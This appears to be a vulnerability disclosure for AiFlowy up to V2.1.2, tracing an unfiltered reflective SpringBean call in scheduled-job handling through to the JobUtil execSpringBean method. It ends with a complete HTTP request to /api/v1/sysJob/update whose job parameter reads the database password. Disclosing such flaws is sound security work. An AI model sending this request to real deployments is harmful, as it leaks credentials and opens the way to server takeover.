# Any SpringBean invocation vulnerability
##### Vulnerability Location: /api/v1/sysJob/update
##### Affected Range: AiFlowy <= V2.1.2
##### Vulnerability Cause: The JobUtil.java file contains a serious vulnerability that enables attackers to carry out arbitrary SpringBean invocations.
##### Vulnerability Impact: Resulting in the leakage of sensitive information, and even obtaining server access privileges.
##### Link: https://gitee.com/aiflowy/aiflowy
# Vulnerability recurrence

There is an arbitrary SpringBean call in the background that leads to the leakage of sensitive information.

<img width="1431" height="364" alt="image" src="https://github.com/user-attachments/assets/8c56ec37-ee97-4f08-9ea5-e68b94550afc" />

There are arbitrary SpringBean invocations in the background scheduled tasks.

<img width="491" height="393" alt="image" src="https://github.com/user-attachments/assets/860eb683-a8b1-4532-ad76-506538dd6206" />

Try to call springContextUtil.getProperty("spring.datatsource.password");

<img width="1358" height="174" alt="image" src="https://github.com/user-attachments/assets/451a4ad9-e916-4ab8-a7ab-af5a29bad95f" />

Dynamic debugging:

<img width="1429" height="624" alt="image" src="https://github.com/user-attachments/assets/e851244a-50e6-4f63-a916-dc30a4270912" />

The quartz scheduled task is responsible for implementing. It progresses to the stage of execution:

<img width="1367" height="656" alt="image" src="https://github.com/user-attachments/assets/102ae1e0-9205-434e-a1f4-6ecc0e8050b5" />

We have entered the BaseQuartJob class! Then continue to move forward and follow to the doExecute method:

<img width="1428" height="481" alt="image" src="https://github.com/user-attachments/assets/70ccce38-61c5-41a6-9fee-58670e9eb16a" />

If you keep going further, you will find that the JobUtil.execute method has been called!

<img width="1461" height="626" alt="image" src="https://github.com/user-attachments/assets/272fff85-fac5-44e5-a111-ac637754d332" />

Since the method we use is to execute the scheduled tasks through the SpringBean approach, so jobType equals 2, and it enters the second if statement, and then continues to follow through to the execSpringBean method!

<img width="1370" height="647" alt="image" src="https://github.com/user-attachments/assets/efd3111c-8c83-4a48-bef4-29f397b1df4c" />

The core method was followed up. The beanMethod and param were directly obtained from the parameters. After obtaining the values, there was no any validation or filtering, and no whitelist was used.
Then, the invoke reflection execution was directly called.

<img width="1397" height="611" alt="image" src="https://github.com/user-attachments/assets/1ec6721e-ef5b-497c-807e-ff00db940dcb" />

This is the entire vulnerability call chain. It can be seen that there is no filtering at all! This leads to arbitrary SpringBean invocations!

# Vulnerability recurrence

```
POST /api/v1/sysJob/update HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
Accept-Language: zh-CN,zh;q=0.9
aiflowy-token: 3c022c8ef4d945ccaf0bf98d05c7dc8a
Sec-Fetch-Dest: empty
sec-ch-ua-mobile: ?0
Accept: application/json, text/plain, */*
Origin: http://192.168.124.10:8899
sec-ch-ua-platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
sec-ch-ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
Referer: http://192.168.124.10:8899/
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Content-Length: 217

{"id":"387145875853594624","jobName":"ceshi","jobType":2,"cronExpression":"* * * * * ?","allowConcurrent":0,"misfirePolicy":3,"jobParams":{"beanMethod":"springContextUtil.getProperty(\"spring.datasource.password\")"}}
```
